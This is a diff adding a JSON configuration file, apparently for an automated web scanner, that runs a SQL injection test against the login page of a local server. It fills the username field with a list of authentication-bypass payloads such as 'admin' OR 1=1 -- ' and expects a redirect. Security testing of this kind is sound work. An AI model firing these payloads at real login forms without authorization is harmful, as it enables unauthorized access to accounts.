@@ -1,0 +1,117 @@
+{
+	"domain": "http://0.0.0.0:8081",
+	"exploits": [
+		{
+			"name": "SQL Injection",
+			"path": "/login",
+			"expected": "redirect",
+			"search_for": [
+				{
+					"tag": "input",
+					"compulsory_attributes": [
+						{
+							"key": "type",
+							"value": "text"
+						}
+					],
+					"possible_attributes": [
+						{
+							"key": "placeholder",
+							"value": ["username", "name", "email", "phone"]
+						},
+						{
+							"key": "class",
+							"value": ["username", "name", "email", "phone"]
+						},
+						{
+							"key": "id",
+							"value": ["username", "name", "email", "phone"]
+						},
+						{
+							"key": "name",
+							"value": ["username", "name", "email", "phone"]
+						}
+					],
+					"action": "fill",
+					"fill_with": [
+						"user' -- ",
+						"default' -- ",
+						"root' -- ",
+						"nobody' -- ",
+						"admin' -- ",
+						"administrator' -- ",
+						"admin' OR 1=1 -- ",
+						"administrator' OR 1=1 -- ",
+						"user' OR 1=1 -- ",
+						"default' OR 1=1 -- ",
+						"root' OR 1=1 -- ",
+						"nobody' OR 1=1 -- ",
+						"admin' OR 1 -- ",
+						"administrator' OR 1 -- ",
+						"user' OR 1 -- ",
+						"default' OR 1 -- ",
+						"root' OR 1 -- ",
+						"nobody' OR 1 -- "
+					]
+				},
+				{
+					"tag": "input",
+					"compulsory_attributes": [
+						{
+							"key": "type",
+							"value": "password"
+						}
+					],
+					"possible_attributes": [
+						{
+							"key": "placeholder",
+							"value": ["password"]
+						},
+						{
+							"key": "class",
+							"value": ["password"]
+						},
+						{
+							"key": "id",
+							"value": ["password"]
+						},
+						{
+							"key": "name",
+							"value": ["password"]
+						}
+					],
+					"action": "fill",
+					"fill_with": ["some_random_password"]
+				},
+				{
+					"tag": ["input", "button"],
+					"compulsory_attributes": [
+						{
+							"key": "type",
+							"value": "submit"
+						}
+					],
+					"possible_attributes": [
+						{
+							"key": "class",
+							"value": ["submit"]
+						},
+						{
+							"key": "id",
+							"value": ["submit"]
+						},
+						{
+							"key": "name",
+							"value": ["submit"]
+						},
+						{
+							"key": "value",
+							"value": ["Sign In", "Login", "Log In"]
+						}
+					],
+					"action": "click"
+				}
+			]
+		}
+	]
+}
